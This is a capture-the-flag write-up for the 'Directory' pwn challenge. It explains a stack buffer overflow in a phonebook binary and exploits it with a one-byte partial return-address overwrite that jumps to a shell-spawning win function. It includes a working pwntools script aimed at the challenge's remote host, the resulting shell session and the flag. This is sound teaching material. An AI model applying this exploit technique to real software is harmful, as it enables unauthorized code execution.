# Directory — PWN Writeup

**Challenge:** Directory  
**Author:** 0xd1s  
**Category:** PWN  
**Description:** twisted  
**Remote:** `nc 35.198.180.77 30993`  
**Flag:** `CTF{3asy_pwn_chall}`

---

## Binary Analysis

```
directory: ELF 64-bit LSB pie executable, x86-64
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

Key observations: **no stack canary** and **PIE enabled** (but no leak needed).

The binary is a simple phonebook / directory manager with four options:

1. **Add a name** — reads up to `0x30` bytes via `read()`, then `memcpy`s into an entry slot
2. **Remove a name** — shifts entries down to fill the gap
3. **Print directory** — lists all stored names
4. **Exit** — breaks the menu loop and returns

A hidden `win()` function calls `system("/bin/sh")`.

## Vulnerability

Inside `process_menu`, the stack frame is laid out as:

```
rbp - 0x1e0:  count (4 bytes)
rbp - 0x1dc:  read buffer (0x30 bytes, used by read())
...
rbp - 0x80:   entry[0].name  (at buf + 0x10c, each entry is 20 bytes)
...
rbp - 0x20:   entry[9].name  (at buf + 0x1c0)
rbp + 0x00:   saved RBP
rbp + 0x08:   return address
```

The program allows up to 10 entries (indices 0–9). When adding name at index 9:

1. `read(0, buf+4, 0x30)` reads up to **48 bytes** into the temporary buffer
2. `memcpy(entry[9], buf+4, read_count)` copies all read bytes to `entry[9].name`

Since `entry[9]` starts at `rbp - 0x20`, writing 0x29 bytes reaches:
- **0x20 bytes** padding to saved RBP
- **8 bytes** overwriting saved RBP
- **1 byte** partially overwriting the return address

## Exploitation

The return address on the stack points back to `main` after calling `process_menu`:

```
0x1561:  call   process_menu    ; in main
0x1566:  mov    eax, 0x0        ; ← return address (low byte = 0x66)
```

The `win` function is at:

```
0x1537:  push   rbp             ; win()
0x1538:  mov    rbp, rsp
0x153b:  lea    rax, ["/bin/sh"] ; win+4
```

Both addresses share the same page — only the **low byte** differs. Since PIE randomizes at page granularity (0x1000), the low 12 bits are fixed. A **single-byte partial overwrite** is 100% reliable with no leak needed.

### Stack Alignment

Returning directly to `win` (0x1537) leaves RSP 16-byte aligned at function entry. However, the x86-64 ABI requires RSP ≡ 8 (mod 16) after the `call` that pushes the return address. The `push rbp` inside `win` would make RSP ≡ 0 (mod 16), but `system()` internally uses `movaps` which requires 16-byte alignment — causing a crash.

The fix: jump to **`win+4`** (0x153b), skipping `push rbp; mov rbp, rsp`. This keeps RSP properly aligned when `system("/bin/sh")` executes.

- Return address low byte: `0x66` → overwrite with **`0x3b`** (win+4)

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *
import sys

HOST = "35.198.180.77"
PORT = 30993

binary = "./directory"
elf    = ELF(binary, checksec=False)
context.binary = elf

def add_name(io, name: bytes):
    io.sendlineafter(b"> ", b"1")
    io.recvuntil(b"Enter name: ")
    io.send(name)

def do_exit(io):
    io.sendlineafter(b"> ", b"4")

def pwn():
    if "REMOTE" in sys.argv:
        io = remote(HOST, PORT)
    else:
        io = process(binary)

    # Fill entries 0-8
    for i in range(9):
        add_name(io, f"name{i}\n".encode())

    # Entry 9: 0x28 bytes padding + 0x3b (partial overwrite → win+4)
    payload = b"A" * 0x28 + b"\x3b"
    add_name(io, payload)

    # Exit triggers return → win+4 → system("/bin/sh")
    do_exit(io)
    io.interactive()

if __name__ == "__main__":
    pwn()
```

## Execution

```
$ python3 exploit.py REMOTE
[+] Opening connection to 35.198.180.77 on port 30993: Done
[*] Switching to interactive mode
Exiting...
$ cat flag.txt
CTF{3asy_pwn_chall}
```
